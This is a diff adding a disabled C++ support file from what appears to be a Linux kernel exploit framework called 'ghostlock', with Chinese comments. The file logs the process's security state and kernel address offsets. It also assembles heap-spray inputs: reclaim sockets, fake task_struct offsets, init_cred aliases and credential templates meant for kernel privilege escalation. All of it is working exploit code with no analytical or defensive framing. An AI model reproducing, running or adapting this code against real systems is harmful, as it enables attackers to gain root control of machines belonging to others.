@@ -1,0 +1,202 @@
+/**
+ * @file support_session.cpp.disabled
+ * @brief 已停用：页资源的会话适配器、启动日志与 prebuilt 槽策略（逻辑迁 Kotlin）。
+ * @note 恢复：mv support_session.cpp.disabled support_session.cpp。
+ */
+#include "support.h"
+#include "session.h"
+#include "profile.h"
+#include "profile_accessors.h"
+#include "memory.h"
+#include "params.h"
+#include "log.h"
+
+using namespace ghostlock;
+
+namespace ghostlock::support {
+    void log_startup_context(void) {
+        std::array < char, 256 > attr{};
+        std::array < char, 32 > enforce{};
+        std::array < char, 4096 > status{};
+        std::array < char, 160 > limits{};
+        snprintf(limits.data(), limits.size(),
+                 "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
+        read_first_line("/proc/self/attr/current", attr.data(), attr.size());
+        read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
+        support::UniqueFd fd(open("/proc/self/status", O_RDONLY | O_CLOEXEC));
+        if (fd.valid()) {
+            const ssize_t n = read(fd.get(), status.data(), status.size() - 1);
+            if (n > 0) {
+                status[static_cast<size_t>(n)] = 0;
+                const std::array<const char *, 3> names = {
+                    "NoNewPrivs:", "Seccomp:", "Seccomp_filters:"
+                };
+                std::array < std::array < char, 32 >, 3 > values = {
+                    {
+                        std::array < char, 32 >{"?"},
+                        std::array < char, 32 >{"?"},
+                        std::array < char, 32 >{"?"},
+                    }
+                };
+                const std::string_view status_view(status.data(), static_cast<size_t>(n));
+                for (size_t i = 0; i < names.size(); i++) {
+                    const size_t at = status_view.find(names[i]);
+                    if (at == std::string_view::npos) continue;
+                    std::string_view rest =
+                            status_view.substr(at + strlen(names[i]));
+                    const size_t first = rest.find_first_not_of("\t ");
+                    if (first == std::string_view::npos) {
+                        values[i][0] = 0;
+                        continue;
+                    }
+                    rest.remove_prefix(first);
+                    size_t len = rest.find_first_of("\r\n");
+                    if (len == std::string_view::npos) len = rest.size();
+                    if (len >= values[i].size()) {
+                        len = values[i].size() - 1;
+                    }
+                    memcpy(values[i].data(), rest.data(), len);
+                    values[i][len] = 0;
+                }
+                snprintf(limits.data(), limits.size(), "NoNewPrivs=%s Seccomp=%s "
+                         "Seccomp_filters=%s", values[0].data(), values[1].data(),
+                         values[2].data());
+            }
+        }
+        struct timespec boot;
+        SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
+        double boot_ms =
+                static_cast<double>(boot.tv_sec) * 1000.0 + static_cast<double>(boot.tv_nsec) / 1e6;
+        pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
+                   "boot_ms=%.0f attr=%s enforce=%s\n",
+                   getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
+                   attr.data(), enforce.data());
+        pr_success("startup limits pid=%d %s\n", getpid(), limits.data());
+        pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
+                   getpid(), kernel::BUILD_VARIANT_LABEL);
+        pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
+                   "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
+                   "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
+                   getpid(), (unsigned long long) session::g_exploit_session.addresses.phys_offset,
+                   (unsigned long long) session::g_exploit_session.addresses.phys_load(),
+                   (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
+                                         session::g_exploit_session.addresses.phys_offset),
+                   (unsigned long long) ghostlock::profile::slide_nfulnl_logger(),
+                   (unsigned long long) ghostlock::profile::slide_random_boot_id_data(),
+                   (unsigned long long) ghostlock::profile::slide_init_task(),
+                   (unsigned long long) ghostlock::profile::slide_root_task_group(),
+                   (unsigned long long) ghostlock::profile::slide_sysctl_bootid());
+    }
+
+
+    void init_p0_profile(void) {
+        pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
+                (unsigned long long) session::g_exploit_session.addresses.phys_load(),
+                (unsigned long long) (session::g_exploit_session.addresses.phys_load() -
+                                      session::g_exploit_session.addresses.phys_offset));
+    }
+
+
+    void close_reclaim_sockets(void) {
+        session::g_exploit_session.heap.current.destroy();
+    }
+
+
+    /**
+     * @brief 会话适配器：把页面喷射所需的槽位/标量搬进 POD。
+     *
+     * @note 目标函数只读 POD；本函数是 `g_exploit_session` 的唯一读取点，
+     *       Kotlin 直接传参落地后删除。
+     */
+    core::PageSprayInputs page_spray_inputs_for(
+        session::ExploitSession &s, const memory::WriteRequest &request) {
+        const profile::kernel_offsets *values = s.profile.values();
+        core::PageSprayInputs in{
+            .current = &s.heap.current,
+            .prebuilt = &s.heap.prebuilt,
+            .quarantine = &s.heap.quarantine,
+            .prepare = &s.heap.prepare,
+            .spray = &s.heap.spray,
+            .pre = &s.heap.pre,
+            .post = &s.heap.post,
+            .leak_child = &s.heap.leak_child,
+            .leak_memfd = &s.heap.leak_memfd,
+            .skb_buffer = &s.heap.skb_buffer,
+            .snitch = &s.heap.snitch,
+            .mm_objs_per_slab = &s.heap.mm_objs_per_slab,
+            .request = request,
+            .main_cpu = config::runtime_config_snapshot().main_cpu,
+            .mm_struct_sz = s.profile.mm_struct_stride(kernel::MM_STRUCT_SZ),
+            .prepare_max_attempts = s.profile.heap_prepare_max_attempts(),
+            .prepare_timeout_ms = s.profile.heap_prepare_timeout_ms(),
+            .kernelsnitch_timeout_ms =
+                s.profile.execution() ? s.profile.execution()->heap_kernelsnitch_timeout_ms : 0,
+            .kernelsnitch_collisions = ghostlock::profile::kernelsnitch_collisions(),
+            .compact_waiter = s.profile.has_compact_waiter() ? 1 : 0,
+            .init_cred_alias = s.addresses.data_alias(s.addresses.init_cred_image_addr()),
+            .init_task_alias = ghostlock::profile::slide_init_task(),
+            .root_task_group_alias = ghostlock::profile::slide_root_task_group(),
+            .direct_map_end = kernel::g_direct_map_end,
+            .tcp_payload_layout = route::route_capability(
+                s.profile,
+                [](auto policy) { return std::decay_t<decltype(policy)>::tcp_payload_layout; }) ? 1 : 0,
+            .ref_image_alias = {
+                s.addresses.data_alias(values ? values->credential.ref0_image : 0),
+                s.addresses.data_alias(values ? values->credential.ref1_image : 0),
+                s.addresses.data_alias(values ? values->credential.ref2_image : 0),
+                s.addresses.data_alias(values ? values->credential.ref3_image : 0),
+            },
+            .compact_task_prio_off = values ? values->task.prio : 0,
+            .compact_task_normal_prio_off = values ? values->task.normal_prio : 0,
+            .compact_task_task_group_off = values ? values->task.sched_task_group : 0,
+            .compact_task_pi_lock_off = values ? values->task.pi_lock : 0,
+            .compact_task_pi_waiters_off = values ? values->task.pi_waiters : 0,
+            .compact_task_pi_top_task_off = values ? values->task.pi_top_task : 0,
+            .compact_task_pi_blocked_off = values ? values->task.pi_blocked_on : 0,
+            .fake_task_prio_off = ghostlock::profile::fake_task_prio_off(),
+            .fake_task_normal_prio_off = ghostlock::profile::fake_task_normal_prio_off(),
+            .fake_task_task_group_off = ghostlock::profile::fake_task_task_group_off(),
+            .fake_task_pi_lock_off = ghostlock::profile::fake_task_pi_lock_off(),
+            .fake_task_pi_waiters_off = ghostlock::profile::fake_task_pi_waiters_off(),
+            .fake_task_pi_top_task_off = ghostlock::profile::fake_task_pi_top_task_off(),
+            .fake_task_pi_blocked_off = ghostlock::profile::fake_task_pi_blocked_on_off(),
+            .credential = values ? values->credential : ghostlock::profile::CredTemplate{},
+        };
+        return in;
+    }
+
+    /* 过渡适配器：仍读进程级会话；原子入口用 `page_spray_inputs_for`。 */
+    core::PageSprayInputs page_spray_inputs_from_session(
+        const memory::WriteRequest &request) {
+        return page_spray_inputs_for(session::g_exploit_session, request);
+    }
+    int32_t quarantine_reclaim_sockets(void) {
+        return session::g_exploit_session.heap.current.move_to(session::g_exploit_session.heap.quarantine,
+                                                               memory::PayloadPageState::Quarantined);
+    }
+
+
+    void release_quarantined_reclaim_sockets(void) {
+        session::g_exploit_session.heap.quarantine.destroy();
+    }
+
+
+    Status stash_prebuilt_page(void) {
+        return session::g_exploit_session.heap.current.move_to(session::g_exploit_session.heap.prebuilt,
+                                                               memory::PayloadPageState::Prebuilt);
+    }
+
+
+    Status activate_prebuilt_page(void) {
+        if (!session::g_exploit_session.heap.prebuilt.has_reclaim()) return false;
+        close_reclaim_sockets();
+        return session::g_exploit_session.heap.prebuilt.move_to(session::g_exploit_session.heap.current,
+                                                                memory::PayloadPageState::Current);
+    }
+
+
+    void discard_prebuilt_page(void) {
+        session::g_exploit_session.heap.prebuilt.destroy();
+    }
+
+} // namespace ghostlock::support
